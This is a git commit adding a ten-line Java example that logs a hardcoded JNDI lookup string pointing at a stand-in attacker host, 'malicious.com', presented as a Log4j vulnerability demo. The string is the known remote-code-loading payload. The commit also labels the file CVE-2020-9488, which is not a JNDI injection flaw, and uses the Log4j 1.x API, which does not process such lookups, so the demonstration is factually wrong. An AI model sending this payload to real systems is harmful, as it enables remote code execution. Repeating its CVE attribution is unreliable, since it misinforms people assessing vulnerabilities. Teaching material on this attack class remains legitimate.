31258af7bde56f78bff6809ad4d31776321964de
ahmadk18361 <ahmadk18361@gmail.com>
2025-07-08 12:36:55 -0400

    Create Log4jCVE2020_9488Example.java

---
+++ src/main/java/com/example/Log4jCVE2020_9488Example.java
@@ -0,0 +1,10 @@
+import org.apache.log4j.Logger;
+
+public class Log4jCVE2020_9488Example {
+    static Logger logger = Logger.getLogger(Log4jCVE2020_9488Example.class);
+
+    public static void main(String[] args) {
+        String username = "${jndi:ldap://malicious.com/exploit}"; // Vulnerable pattern
+        logger.error("Login failed for user: " + username);       // Dangerous in old Log4j
+    }
+}
